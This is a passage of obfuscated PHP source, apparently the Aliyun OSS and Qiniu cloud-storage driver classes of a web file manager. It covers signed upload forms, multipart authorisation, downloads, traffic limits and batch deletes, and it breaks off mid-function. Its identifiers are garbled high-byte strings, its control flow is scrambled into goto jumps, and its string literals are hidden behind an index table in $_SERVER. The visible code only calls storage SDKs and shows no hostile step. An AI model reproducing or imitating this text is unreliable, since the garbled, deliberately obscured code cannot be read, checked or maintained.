(OSS\Core\OssException $F”ìŞ¨‘¤ò) { return !1; } return $this->getPathOuter($e¨±¹¹ãˆ); } public function getHost() { $C«˜ŸÌÅ Ò =& $_SERVER[òÀöí]; $C§ù±ÉğÑ× = explode($C«˜ŸÌÅ Ò[177], parent::getHost()); return $C§ù±ÉğÑ×[0] . $C«˜ŸÌÅ Ò[177] . $this->bucket . $C«˜ŸÌÅ Ò[94] . $C§ù±ÉğÑ×[1]; } public function uploadFormData($A‰Ì”¢Ÿ¸¦, $D‡ªœ‰ˆÚñ = 3600) { goto fÁßÖ‹¼õö; Cš®ØŒŞˆØ: return $f£Ò­ƒ¢’Í; goto AöÅ÷Î§º; B·§õ–Ï„’: $dÒµÒÖ£ô = date($Dêïù»Ÿ®‡[1265], time() + $Dİ÷Â…ñÀó); $c¢™Ø«”²˜ = new DateTime($dÒµÒÖ£ô); $BÌäÌÆ•òâ = $c¢™Ø«”²˜->format(DateTime::ISO8601); goto EˆàğÂÅÃ; fÁßÖ‹¼õö: $Dêïù»Ÿ®‡ =& $_SERVER[òÀöí]; if (!($D’î÷æÖØ = $this->getHost())) { return !1; } $Dİ÷Â…ñÀó = $D‡ªœ‰ˆÚñ; goto B·§õ–Ï„’; Aß»Ó‡Ğ×Ü: $cà ÅµääÅ = base64_encode(hash_hmac($Dêïù»Ÿ®‡[228], $FÛáö§ÄÇ, $this->secret, !0)); $f£Ò­ƒ¢’Í = array($Dêïù»Ÿ®‡[1176] => $FÛáö§ÄÇ, $Dêïù»Ÿ®‡[1268] => $this->accessKey, $Dêïù»Ÿ®‡[1172] => $Dêïù»Ÿ®‡[1164], $Dêïù»Ÿ®‡[1269] => $cà ÅµääÅ, $Dêïù»Ÿ®‡[175] => $D’î÷æÖØ); $f£Ò­ƒ¢’Í = $this->trafficLimit($Dêïù»Ÿ®‡[1262], $f£Ò­ƒ¢’Í); goto Cš®ØŒŞˆØ; bå—“‰‚¹á: $cø¦Ä®¥° = $this->pathFather($A‰Ì”¢Ÿ¸¦); $Aƒ‡ÊÀ¬İ = array($Dêïù»Ÿ®‡[1166] => $BÌäÌÆ•òâ, $Dêïù»Ÿ®‡[1167] => array(array($Dêïù»Ÿ®‡[1267], 0, $fï“êˆË¨’), array($Dêïù»Ÿ®‡[1170], $Dêïù»Ÿ®‡[1171], $cø¦Ä®¥°))); $FÛáö§ÄÇ = base64_encode(json_encode($Aƒ‡ÊÀ¬İ)); goto Aß»Ó‡Ğ×Ü; EˆàğÂÅÃ: $DØëÂ²¿ğ¥ = strpos($BÌäÌÆ•òâ, $Dêïù»Ÿ®‡[292]); $BÌäÌÆ•òâ = substr($BÌäÌÆ•òâ, 0, $DØëÂ²¿ğ¥) . $Dêïù»Ÿ®‡[1266]; $fï“êˆË¨’ = 1048576000 * 5; goto bå—“‰‚¹á; AöÅ÷Î§º: } public function multiUploadFormData($B£ê‘ã”’, $FšÔñ¥ŠÊ = 3600) { $c†õôƒ—õç =& $_SERVER[òÀöí]; if (!($F¥ÉÁÀŠÚ = $this->getHost())) { return !1; } $bÑ³‹Ë®Œ = $this->trafficLimit($c†õôƒ—õç[1262]); $eÂÈÀââÆ§ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B£ê‘ã”’), $bÑ³‹Ë®Œ); return array($c†õôƒ—õç[219] => $eÂÈÀââÆ§, $c†õôƒ—õç[175] => $F¥ÉÁÀŠÚ . $c†õôƒ—õç[8] . $this->pathEncode($B£ê‘ã”’), $c†õôƒ—õç[220] => gmdate($c†õôƒ—õç[1270]), $c†õôƒ—õç[92] => $B£ê‘ã”’); } public function multiUploadAuthData($a«ì•Ã½Œ, $B¶‚‚©ë¯ = array()) { goto eøèÂ¥»“×; AÇïÕˆ»¾Í: if (!empty($B¶‚‚©ë¯[$CÖî–Í·÷Ú[1272]])) { $Fõ¸…À§¾‘ = array_merge(array($Bç™ˆîæÈµ[4]), $B¶‚‚©ë¯[$CÖî–Í·÷Ú[1272]]); sort($Fõ¸…À§¾‘); $Bç™ˆîæÈµ[4] = implode($CÖî–Í·÷Ú[227], $Fõ¸…À§¾‘); } $C¶ĞŒŞÉ¬Ê = implode($CÖî–Í·÷Ú[227], $Bç™ˆîæÈµ); $e•Ô§µĞ‡‘ = base64_encode(hash_hmac($CÖî–Í·÷Ú[228], $C¶ĞŒŞÉ¬Ê, $this->secret, !0)); goto E…”†ƒ³––; E…”†ƒ³––: $Cã”Ÿæáù™ = $CÖî–Í·÷Ú[1235] . $this->accessKey . $CÖî–Í·÷Ú[4] . $e•Ô§µĞ‡‘; if (strpos($C¾¡á¬‡, $CÖî–Í·÷Ú[223]) === 0) { $Cã”Ÿæáù™ = array($CÖî–Í·÷Ú[230] => $Cã”Ÿæáù™, $CÖî–Í·÷Ú[220] => $eÌéÀá„÷); if ($eëòÑ‰Ğó¿) { $Cã”Ÿæáù™ = array_merge($Cã”Ÿæáù™, $eëòÑ‰Ğó¿); } } return $Cã”Ÿæáù™; goto EŸõî®Ôœè; eøèÂ¥»“×: $CÖî–Í·÷Ú =& $_SERVER[òÀöí]; $eÌéÀá„÷ = isset($B¶‚‚©ë¯[$CÖî–Í·÷Ú[220]]) ? $B¶‚‚©ë¯[$CÖî–Í·÷Ú[220]] : gmdate($CÖî–Í·÷Ú[1270]); $C¾¡á¬‡ = isset($B¶‚‚©ë¯[$CÖî–Í·÷Ú[167]]) ? $B¶‚‚©ë¯[$CÖî–Í·÷Ú[167]] : $CÖî–Í·÷Ú[33]; goto aÖ‘…–ìÀ›; aÖ‘…–ìÀ›: $CøÒ˜¼Šç‹ = $a«ì•Ã½Œ; if (isset($B¶‚‚©ë¯[$CÖî–Í·÷Ú[92]])) { $CøÒ˜¼Šç‹ = $B¶‚‚©ë¯[$CÖî–Í·÷Ú[92]]; unset($B¶‚‚©ë¯[$CÖî–Í·÷Ú[92]]); } if (isset($B¶‚‚©ë¯[$CÖî–Í·÷Ú[221]])) { $B¶‚‚©ë¯[$CÖî–Í·÷Ú[220]] = $eÌéÀá„÷; return $this->listUploadParts($CøÒ˜¼Šç‹, $B¶‚‚©ë¯); } goto FŠ˜ìˆ¡¯ª; FŠ˜ìˆ¡¯ª: $Bç™ˆîæÈµ = array($CÖî–Í·÷Ú[222], $CÖî–Í·÷Ú[33], $CÖî–Í·÷Ú[118], $eÌéÀá„÷, "\170\x2d\x6f\x73\x73\x2d\x64\x61\164\145\x3a{$eÌéÀá„÷}", $CÖî–Í·÷Ú[8] . $this->bucket . $CÖî–Í·÷Ú[8] . $CøÒ˜¼Šç‹ . $C¾¡á¬‡); if (strpos($C¾¡á¬‡, $CÖî–Í·÷Ú[223]) === 0) { $Bç™ˆîæÈµ[0] = $CÖî–Í·÷Ú[224]; if ($eëòÑ‰Ğó¿ = $this->trafficLimit($CÖî–Í·÷Ú[1262])) { $CøÒ˜¼Šç‹ = $CÖî–Í·÷Ú[1271]; array_splice($Bç™ˆîæÈµ, 5, 0, $CøÒ˜¼Šç‹ . $CÖî–Í·÷Ú[4] . $eëòÑ‰Ğó¿[$CøÒ˜¼Šç‹]); } } if (isset($B¶‚‚©ë¯[$CÖî–Í·÷Ú[225]]) && $B¶‚‚©ë¯[$CÖî–Í·÷Ú[225]] == $CÖî–Í·÷Ú[226]) { $Bç™ˆîæÈµ[0] = $CÖî–Í·÷Ú[226]; } goto AÇïÕˆ»¾Í; EŸõî®Ôœè: } public function listUploadParts($c„¾£‹ÈÄù, $eÔô²ğóÑ¢) { goto B·‚é®Âà•; B·‚é®Âà•: $dÍ‚œìÒŸ =& $_SERVER[òÀöí]; $cŠ¥éá»‡õ = parse_url_query($eÔô²ğóÑ¢[$dÍ‚œìÒŸ[167]]); $Eªƒ«Íµ£ä = $this->client->listParts($this->bucket, $this->pathEncode($c„¾£‹ÈÄù), $cŠ¥éá»‡õ[$dÍ‚œìÒŸ[219]]); goto BÔÍ’Şß–; BÔÍ’Şß–: $D™ä¥öË = $Eªƒ«Íµ£ä->getListPart(); $f‰°Š‚Óõó = array(); foreach ($D™ä¥öË as $Aó…ÒÃÚİ) { $f‰°Š‚Óõó[] = array($dÍ‚œìÒŸ[1255] => $Aó…ÒÃÚİ->getPartNumber(), $dÍ‚œìÒŸ[1256] => trim($Aó…ÒÃÚİ->getETag(), $dÍ‚œìÒŸ[115])); } goto cÊ¯Áô ¿‹; Eà‰¯öŒÍ…: return array($dÍ‚œìÒŸ[230] => $C¬äí¼­±Ä, $dÍ‚œìÒŸ[220] => $eÔô²ğóÑ¢[$dÍ‚œìÒŸ[220]], $dÍ‚œìÒŸ[232] => $f‰°Š‚Óõó); goto c‰–¸½çîŸ; cÊ¯Áô ¿‹: unset($eÔô²ğóÑ¢[$dÍ‚œìÒŸ[221]], $eÔô²ğóÑ¢[$dÍ‚œìÒŸ[225]]); $C¬äí¼­±Ä = $this->multiUploadAuthData($c„¾£‹ÈÄù, $eÔô²ğóÑ¢); if (empty($C¬äí¼­±Ä)) { return !1; } goto Eà‰¯öŒÍ…; c‰–¸½çîŸ: } public function download($A§µ¸õÊª×, $D‚²ÆïÆÄ×) { if ($this->isFolder($A§µ¸õÊª×)) { return !1; } try { $A¾…è¥—•– = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $D‚²ÆïÆÄ×); $A¾…è¥—•– = $this->trafficLimit($_SERVER[òÀöí][108], $A¾…è¥—•–); $this->client->getObject($this->bucket, $this->pathEncode($A§µ¸õÊª×), $A¾…è¥—•–); } catch (OSS\Core\OssException $AÎµ†‰Ò“¢) { return !1; } return $D‚²ÆïÆÄ×; } public function fileSubstr($Cõğˆ°ŠÕ, $B¶åÊ“•ÉŒ = 0, $cšÀƒİã = false) { if ($B¶åÊ“•ÉŒ === -1) { $fÂ—Ğ°é³­ = array(); } else { if ($cšÀƒİã === !1) { $A—Ğ¨‚§ˆé = $this->size($Cõğˆ°ŠÕ); } else { $A—Ğ¨‚§ˆé = $B¶åÊ“•ÉŒ + $cšÀƒİã - 1; } $fÂ—Ğ°é³­ = array(OSS\OssClient::OSS_RANGE => "{$B¶åÊ“•ÉŒ}\x2d{$A—Ğ¨‚§ˆé}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Cõğˆ°ŠÕ), $fÂ—Ğ°é³­); } catch (OSS\Core\OssException $dƒÄĞ¢‹Š) { think_exception($dƒÄĞ¢‹Š->getMessage()); return !1; } } private function trafficLimit($F†øâ†¥¨¼, $D¶’Å„ˆ± = array()) { goto dÌ¶ó†Ã®É; dÌ¶ó†Ã®É: $EÆŸŞÕÏó› =& $_SERVER[òÀöí]; if ($F†øâ†¥¨¼ == $EÆŸŞÕÏó›[1262] && $this->isUploadServer() || $F†øâ†¥¨¼ == $EÆŸŞÕÏó›[108] && $this->isFileOutServer()) { return $D¶’Å„ˆ±; } $b¤İ×›”Ğë = floatval($GLOBALS[$EÆŸŞÕÏó›[6]][$EÆŸŞÕÏó›[87]][$EÆŸŞÕÏó›[106]][$F†øâ†¥¨¼]) * 1024 * 1024 * 8; goto c÷Ÿ°¿’¦; B§çîŠ’„ê: return $D¶’Å„ˆ±; goto C×Ñ¹ÚØ‘—; c÷Ÿ°¿’¦: if (!$b¤İ×›”Ğë) { return $D¶’Å„ˆ±; } $b¤İ×›”Ğë = $b¤İ×›”Ğë < 819200 ? 819200 : ($b¤İ×›”Ğë > 838860800 ? 838860800 : $b¤İ×›”Ğë); $D¶’Å„ˆ±[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($b¤İ×›”Ğë); goto B§çîŠ’„ê; C×Ñ¹ÚØ‘—: } public function link($b¤Â…Äò¥, $bİŠä©å·ù = array()) { $eÜÇØÔëØÏ =& $_SERVER[òÀöí]; if (!$this->exist($b¤Â…Äò¥) || $this->isFolder($b¤Â…Äò¥)) { return !1; } try { $bİŠä©å·ù = $this->trafficLimit($eÜÇØÔëØÏ[108], $bİŠä©å·ù); $A˜ç§É‡Åã = $this->client->signUrl($this->bucket, $this->pathEncode($b¤Â…Äò¥), 3600 * 12, $eÜÇØÔëØÏ[226], $bİŠä©å·ù); return $this->getCdnLink($A˜ç§É‡Åã); } catch (OSS\Core\OssException $CÕã‡ëÛ‰ù) { return !1; } } public function fileOut($Eâ¹ŸÂµá«, $eøÙó¹÷ = false, $FÖŞ­¡¢ÓÃ = false, $Fâš´•œÁæ = '') { goto F±›–ñÒğ’; dº¿µ©¿¡á: $eøÙó¹÷ = $eøÙó¹÷ ? $E—Ï†áÊÌº[212] : $E—Ï†áÊÌº[213]; $a°™ù¬îËÏ = array(OSS\OssClient::OSS_SUB_RESOURCE => $E—Ï†áÊÌº[1273] . rawurlencode("{$eøÙó¹÷}\x3b\146\x69\x6c\x65\156\141\155\145\x3d{$FÖŞ­¡¢ÓÃ}")); $a°™ù¬îËÏ[OSS\OssClient::OSS_SUB_RESOURCE] .= $E—Ï†áÊÌº[1274] . rawurlencode($E¥¢ÍÕ„·); goto b×‰†µí; bù¼óøîÑƒ: $FÖŞ­¡¢ÓÃ = rawurlencode($FÖŞ­¡¢ÓÃ); $E¥¢ÍÕ„· = get_file_mime(get_path_ext($FÖŞ­¡¢ÓÃ)); if ($E¥¢ÍÕ„· == $E—Ï†áÊÌº[211]) { return parent::fileOut($Eâ¹ŸÂµá«, $eøÙó¹÷, $FÖŞ­¡¢ÓÃ, $Fâš´•œÁæ); } goto dº¿µ©¿¡á; b×‰†µí: $EæÏ—Ç¬å = $this->link($Eâ¹ŸÂµá«, $a°™ù¬îËÏ); $this->fileOutLink($EæÏ—Ç¬å); goto f¦Ğºê¬å•; F±›–ñÒğ’: $E—Ï†áÊÌº =& $_SERVER[òÀöí]; if ($this->isFileOutServer()) { return $this->fileOutServer($Eâ¹ŸÂµá«, $eøÙó¹÷, $FÖŞ­¡¢ÓÃ, $Fâš´•œÁæ); } if (!$FÖŞ­¡¢ÓÃ) { $FÖŞ­¡¢ÓÃ = $this->pathThis($Eâ¹ŸÂµá«); } goto bù¼óøîÑƒ; f¦Ğºê¬å•: } public function fileOutServer($fİ—ÚÖ‡ÆŒ, $FóÎç«ğà™ = false, $D…’–›î ¿ = false, $B÷åç–êÓÍ = '') { parent::fileOut($fİ—ÚÖ‡ÆŒ, $FóÎç«ğà™, $D…’–›î ¿, $B÷åç–êÓÍ); } public function fileOutImage($b¬İ—İœ Š, $cÎŠ÷©‹¨¡ = 250) { $bÂ¡çëÚÙ° = array(OSS\OssClient::OSS_PROCESS => $_SERVER[òÀöí][1275] . $cÎŠ÷©‹¨¡); $a¯ÅÀéÍĞ¾ = $this->link($b¬İ—İœ Š, $bÂ¡çëÚÙ°); $this->fileOutLink($a¯ÅÀéÍĞ¾); } public function fileOutImageServer($A—–ùƒÚ‹ê, $a‚«¦»¸Õ· = 250) { parent::fileOutImage($A—–ùƒÚ‹ê, $a‚«¦»¸Õ·); } public function fileOutLink($C›§ÂÁä«Ñ) { $F‡Ş‡¨†ÒÕ =& $_SERVER[òÀöí]; if (!$this->isCdnHost() && substr($C›§ÂÁä«Ñ, 0, 7) == $F‡Ş‡¨†ÒÕ[1179]) { $C›§ÂÁä«Ñ = $F‡Ş‡¨†ÒÕ[1180] . substr($C›§ÂÁä«Ñ, 7); } header($F‡Ş‡¨†ÒÕ[158] . $C›§ÂÁä«Ñ); die; } public function hashMd5($aéˆãÔöÎ, $dùÔÍ¡Ù² = '') { $D‡ğ•öŞÔ“ =& $_SERVER[òÀöí]; $DŞ¦¥ ®¡Ë = $this->_objectMeta($aéˆãÔöÎ); if (!$DŞ¦¥ ®¡Ë) { return $D‡ğ•öŞÔ“[33]; } if (!isset($DŞ¦¥ ®¡Ë[$D‡ğ•öŞÔ“[1251]]) && !empty($dùÔÍ¡Ù²)) { $F—Œå¥·ƒ = $this->updateObjMeta($aéˆãÔöÎ, array($D‡ğ•öŞÔ“[1251] => $dùÔÍ¡Ù²)); $DŞ¦¥ ®¡Ë[$D‡ğ•öŞÔ“[1251]] = $F—Œå¥·ƒ ? $dùÔÍ¡Ù² : $D‡ğ•öŞÔ“[33]; } return isset($DŞ¦¥ ®¡Ë[$D‡ğ•öŞÔ“[1251]]) ? strtolower($DŞ¦¥ ®¡Ë[$D‡ğ•öŞÔ“[1251]]) : $D‡ğ•öŞÔ“[33]; } public function size($Fó„çŒÊÈí) { $eßÚ‚çÀµˆ = $this->objectMeta($Fó„çŒÊÈí); return $eßÚ‚çÀµˆ ? $eßÚ‚çÀµˆ[$_SERVER[òÀöí][77]] : 0; } public function info($b¥ÇíŠí˜) { if ($this->isFolder($b¥ÇíŠí˜)) { return $this->folderInfo($b¥ÇíŠí˜); } else { if ($this->isFile($b¥ÇíŠí˜)) { return $this->fileInfo($b¥ÇíŠí˜); } } return !1; } public function exist($fĞë´ÀÕ‚Ì) { return $this->isFile($fĞë´ÀÕ‚Ì) || $this->isFolder($fĞë´ÀÕ‚Ì); } public function isFile($Fˆ£óõ¡í•) { return !$this->isFolder($Fˆ£óõ¡í•) && $this->objectMeta($Fˆ£óõ¡í•); } public function isFolder($eÅ¸ß²ñÂ·) { return $this->cacheMethod($_SERVER[òÀöí][197], $eÅ¸ß²ñÂ·); } protected function objectMeta($f£áÒÌÊ„) { return $this->cacheMethod($_SERVER[òÀöí][198], $f£áÒÌÊ„); } protected function _objectMeta($B á®©ÇÈ«) { $e“ß‘ÃÌª‘ =& $_SERVER[òÀöí]; try { $cá˜æ½Í×³ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($B á®©ÇÈ«)); } catch (OSS\Core\OssException $a•…É×¤´î) { $cá˜æ½Í×³ = !1; } if ($cá˜æ½Í×³) { $cá˜æ½Í×³[$e“ß‘ÃÌª‘[77]] = intval($cá˜æ½Í×³[$e“ß‘ÃÌª‘[1249]]); } return $cá˜æ½Í×³; } protected function _isFolder($e½Ã„•ˆÃÍ) { $Fã‰ºÜ£Å° =& $_SERVER[òÀöí]; if ($e½Ã„•ˆÃÍ == $Fã‰ºÜ£Å°[33] || $e½Ã„•ˆÃÍ == $Fã‰ºÜ£Å°[8]) { return !0; } $E×ÖÓïˆ‹÷ = array($Fã‰ºÜ£Å°[1245] => $Fã‰ºÜ£Å°[8], $Fã‰ºÜ£Å°[1246] => rtrim($e½Ã„•ˆÃÍ, $Fã‰ºÜ£Å°[8]) . $Fã‰ºÜ£Å°[8], $Fã‰ºÜ£Å°[1247] => 1, $Fã‰ºÜ£Å°[1248] => $Fã‰ºÜ£Å°[33]); $D¾‚ŠîÃ§… = $this->client->listObjects($this->bucket, $E×ÖÓïˆ‹÷); if ($D¾‚ŠîÃ§…->getObjectList() || $D¾‚ŠîÃ§…->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($CÛñÎÑíœ) { parent::__construct(); require_once SDK_DIR . $_SERVER[òÀöí][1276]; $this->_init($CÛñÎÑíœ); } public function _init($cÉƒ®ƒé”) { goto A‹â•Ş•‹; A‹â•Ş•‹: $aÜ•“ª—Ôå =& $_SERVER[òÀöí]; foreach ($cÉƒ®ƒé” as $dš¾È¤½š× => $b»…‹œ‹º«) { if (isset($this->{$dš¾È¤½š×})) { $this->{$dš¾È¤½š×} = $b»…‹œ‹º«; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($aÜ•“ª—Ôå[1277] . LNG($aÜ•“ª—Ôå[1236])); } goto b­Ñ•‘Ø‹µ; b­Ñ•‘Ø‹µ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto FÛÍ‚„ßŸ; FÛÍ‚„ßŸ: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto A‘«˜ßœÏ…; A‘«˜ßœÏ…: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Cä±ÒÅåŒ, $dÉŒôÍÑª… = '', $c¹Šá¶óÛ = REPEAT_RENAME) { if ($this->setContent($Cä±ÒÅåŒ, $dÉŒôÍÑª…)) { return $this->getPathOuter($Cä±ÒÅåŒ); } return !1; } public function mkdir($DÂŸª•Ÿ½, $d¬òªè‡Ñ† = REPEAT_SKIP) { goto bÒ‹„ìÉ¸; d•Ú–ÔŞ¯ß: $DÂŸª•Ÿ½ = $dÑ¹‰ÌŸ•Ï . $BÅ¹òœ’´ß[8]; $Dœš¥Û³ = get_path_this($dÑ¹‰ÌŸ•Ï); $E£µÇ¢Ó°Ö = $DÂŸª•Ÿ½ . $Dœš¥Û³; goto EÓå„Ü‹è; EÓå„Ü‹è: if (!$this->mkfile($E£µÇ¢Ó°Ö)) { return !1; } if (!$this->moveFile($E£µÇ¢Ó°Ö, $DÂŸª•Ÿ½)) { $this->delFile($E£µÇ¢Ó°Ö); return !1; } return $this->getPathOuter($dÑ¹‰ÌŸ•Ï); goto F¿’á÷Òƒ¡; bÒ‹„ìÉ¸: $BÅ¹òœ’´ß =& $_SERVER[òÀöí]; $dÑ¹‰ÌŸ•Ï = trim($DÂŸª•Ÿ½, $BÅ¹òœ’´ß[8]); if ($this->_isFolder($dÑ¹‰ÌŸ•Ï)) { return $this->getPathOuter($dÑ¹‰ÌŸ•Ï); } goto d•Ú–ÔŞ¯ß; F¿’á÷Òƒ¡: } public function copyFile($C¾„ÎÈ—–Ì, $B¹¸ ‹Å…) { $cß¾ïò‰ = $this->bucketManager->copy($this->bucket, $C¾„ÎÈ—–Ì, $this->bucket, $B¹¸ ‹Å…, !0); return $cß¾ïò‰ ? !1 : $this->getPathOuter($B¹¸ ‹Å…); } public function moveFile($Dí‚Ã¤êí³, $bÙğ­…¨¤) { $báÆ¼ğ©Ñ = $this->bucketManager->move($this->bucket, $Dí‚Ã¤êí³, $this->bucket, $bÙğ­…¨¤, !0); return $báÆ¼ğ©Ñ ? !1 : $this->getPathOuter($bÙğ­…¨¤); } public function delFile($Câğ©™„îÔ) { if (!$this->exist($Câğ©™„îÔ)) { return !0; } $dËÇÓÊµ‡÷ = $this->bucketManager->delete($this->bucket, $Câğ©™„îÔ); return $dËÇÓÊµ‡÷ ? !1 : !0; } public function delFolder($BéÜ»™àå©) { goto AÑ·æÄòà¾; D²ìØ•œ˜ç: return $this->delByBatch($aÅƒù½Í˜[$F òì­ÉÃŸ[74]]); goto DôÆë©”Ï½; F…ŠÜô¿õ„: $aÅƒù½Í˜ = $this->fileList($BéÜ»™àå©); $this->listItemCache = !0; $EàÄ‚Ü‚ = trim($BéÜ»™àå©, $F òì­ÉÃŸ[8]) . $F òì­ÉÃŸ[8]; goto Aä„ÜìÏË; AÑ·æÄòà¾: $F òì­ÉÃŸ =& $_SERVER[òÀöí]; if (!$this->exist($BéÜ»™àå©)) { return !0; } $this->listItemCache = !1; goto F…ŠÜô¿õ„; Aä„ÜìÏË: if (!empty($BéÜ»™àå©) && !in_array($EàÄ‚Ü‚, $aÅƒù½Í˜[$F òì­ÉÃŸ[74]])) { $aÅƒù½Í˜[$F òì­ÉÃŸ[74]][] = $EàÄ‚Ü‚; } $A³ Ğ†‚â… = $this->delByBatch($aÅƒù½Í˜[$F òì­ÉÃŸ[73]]); if (!$A³ Ğ†‚â…) { return !1; } goto D²ìØ•œ˜ç; DôÆë©”Ï½: } private function delByBatch($EğøÏ˜åÑ) { foreach (array_chunk($EğøÏ˜åÑ, 1000) as $Dß‘Ÿ˜¡Ï–) { $fİ’ËŒåæö = $this->bucketManager->buildBatchDelete($this->bucket, $Dß‘Ÿ˜¡Ï–); list($dÕ´—éƒá, $CîïÂ«ƒ›Ó) = $this->bucketManager->batch($fİ’ËŒåæö); if ($CîïÂ«ƒ›Ó) { return !1; } } return !0; } public function rename($E¤«ÏºÛè, $eÅŸˆÈ™¡ƒ) { return $this->renameObject($E¤«ÏºÛè, $eÅŸˆÈ™¡ƒ); } public function fileInfo($B¸—›ƒ‚ÑÎ, $CâÀØ„­’ = false, $E‘ÖÑ¯ˆ‹„ = array()) { goto BÉí‰Œ—é‘; BÉí‰Œ—é‘: $D–†ÙÁ™È¢ =& $_SERVER[òÀöí]; $dÈß‹¤¥ØÒ = array($D–†ÙÁ™È¢[28] => $this->pathThis($B¸—›ƒ‚ÑÎ), $D–†ÙÁ™È¢[75] => $this->getPathOuter($D–†ÙÁ™È¢[8] . $B¸—›ƒ‚ÑÎ), $D–†ÙÁ™È¢[29] => $D–†ÙÁ™È¢[173], $D–†ÙÁ™È¢[77] => isset($E‘ÖÑ¯ˆ‹„[$D–†ÙÁ™È¢[1278]]) ? $E‘ÖÑ¯ˆ‹„[$D–†ÙÁ™È¢[1278]] : 0, $D–†ÙÁ™È¢[167] => $this->ext($B¸—›ƒ‚ÑÎ)); if ($CâÀØ„­’) { return $dÈß‹¤¥ØÒ; } goto dÜáôêƒŠÅ; dÜáôêƒŠÅ: $dÈß‹¤¥ØÒ[$D–†ÙÁ™È¢[192]] = $dÈß‹¤¥ØÒ[$D–†ÙÁ™È¢[83]] = 0; $dÈß‹¤¥ØÒ[$D–†ÙÁ™È¢[193]] = $dÈß‹¤¥ØÒ[$D–†ÙÁ™È¢[194]] = !0; if (empty($E‘ÖÑ¯ˆ‹„)) { $E‘ÖÑ¯ˆ‹„ = $this->objectMeta($B¸—›ƒ‚ÑÎ); if (!$E‘ÖÑ¯ˆ‹„) { return $dÈß‹¤¥ØÒ; } } goto AŸòà‡¤áÔ; AŸòà‡¤áÔ: if (isset($E‘ÖÑ¯ˆ‹„[$D–†ÙÁ™È¢[1279]])) { $dÈß‹¤¥ØÒ[$D–†ÙÁ™È¢[83]] = substr($E‘ÖÑ¯ˆ‹„[$D–†ÙÁ™È¢[1279]] . $D–†ÙÁ™È¢[33], 0, 10); } if (isset($E‘ÖÑ¯ˆ‹„[$D–†ÙÁ™È¢[1278]])) { $dÈß‹¤¥ØÒ[$D–†ÙÁ™È¢[77]] = $E‘ÖÑ¯ˆ‹„[$D–†ÙÁ™È¢[1278]]; } return $dÈß‹¤¥ØÒ; goto Fò²²—ÔåÍ; Fò²²—ÔåÍ: } public function folderInfo($e®äÌ…•ãÆ, $EÛ»À–ï§í = false) { goto AŞÕŒÕâ¿˜; EÕ¹ß¿±æ: $aêšã½Äò™ = $this->objectMeta($e®äÌ…•ãÆ); if (isset($aêšã½Äò™[$Eğ×‰èÍĞ“[1279]])) { $Fè¦ˆöƒŒ[$Eğ×‰èÍĞ“[83]] = substr($aêšã½Äò™[$Eğ×‰èÍĞ“[1279]] . $Eğ×‰èÍĞ“[33], 0, 10); } return $Fè¦ˆöƒŒ; goto d¦ÇéÄÃÅÜ; AŞÕŒÕâ¿˜: $Eğ×‰èÍĞ“ =& $_SERVER[òÀöí]; $Fè¦ˆöƒŒ = array($Eğ×‰èÍĞ“[28] => $this->pathThis($e®äÌ…•ãÆ), $Eğ×‰èÍĞ“[75] => $this->getPathOuter($Eğ×‰èÍĞ“[8] . $e®äÌ…•ãÆ), $Eğ×‰èÍĞ“[29] => $Eğ×‰èÍĞ“[76]); if ($EÛ»À–ï§í) { return $Fè¦ˆöƒŒ; } goto eõÙï•½«; eõÙï•½«: $Fè¦ˆöƒŒ[$Eğ×‰èÍĞ“[192]] = $Fè¦ˆöƒŒ[$Eğ×‰èÍĞ“[83]] = 0; $Fè¦ˆöƒŒ[$Eğ×‰èÍĞ“[193]] = $Fè¦ˆöƒŒ[$Eğ×‰èÍĞ“[194]] = !0; $e®äÌ…•ãÆ = rtrim($e®äÌ…•ãÆ, $Eğ×‰èÍĞ“[8]) . $Eğ×‰èÍĞ“[8]; goto EÕ¹ß¿±æ; d¦ÇéÄÃÅÜ: } public function listPath($BùçãÕØ¥´, $BË¯­ªâ¶Ğ = false) { $BñØ¸…¬Ì’ =& $_SERVER[òÀöí]; $B¸ë¥šÎ© = $this->fileList($BùçãÕØ¥´, $BñØ¸…¬Ì’[8], !0); foreach ($B¸ë¥šÎ©[$BñØ¸…¬Ì’[74]] as $fã¸Œ½‹— => $dÃË¨¦š¾¢) { $B¸ë¥šÎ©[$BñØ¸…¬Ì’[74]][$fã¸Œ½‹—] = $this->folderInfo($dÃË¨¦š¾¢, $BË¯­ªâ¶Ğ); } foreach ($B¸ë¥šÎ©[$BñØ¸…¬Ì’[73]] as $fã¸Œ½‹— => $dÃË¨¦š¾¢) { $B¸ë¥šÎ©[$BñØ¸…¬Ì’[73]][$fã¸Œ½‹—] = $this->fileInfo($dÃË¨¦š¾¢[$BñØ¸…¬Ì’[92]], $BË¯­ªâ¶Ğ, $dÃË¨¦š¾¢); } return $B¸ë¥šÎ©; } public function has($b£šùÛŠµŒ, $FÕŠ–•”¼Í = false, $dš²ëèà› = true) { goto cÕÏà°Úéô; e÷ë„×Š: $F„İÕëñ±Š = $b‘ÌØæ‚ô = 0; while (!0) { check_abort(); list($cŠ”´›¼»›, $F‚õ¨ïà‚Ş) = $this->bucketManager->listFiles($this->bucket, $e‡Ëêâ®«, $a‰ÚåÕ·„, $Dì‚£Ù®±, $a»Ô¬ºÁ›×); if ($F‚õ¨ïà‚Ş) { break; } $a‰ÚåÕ·„ = array_key_exists($AïšÑ°Î³[1248], $cŠ”´›¼»›) ? $a‰ÚåÕ·„ = $cŠ”´›¼»›[$AïšÑ°Î³[1280]] : $AïšÑ°Î³[33]; if ($FÕŠ–•”¼Í) { if (!empty($cŠ”´›¼»›[$AïšÑ°Î³[1281]])) { $F„İÕëñ±Š += count($cŠ”´›¼»›[$AïšÑ°Î³[1281]]); } if (!empty($cŠ”´›¼»›[$AïšÑ°Î³[1282]])) { 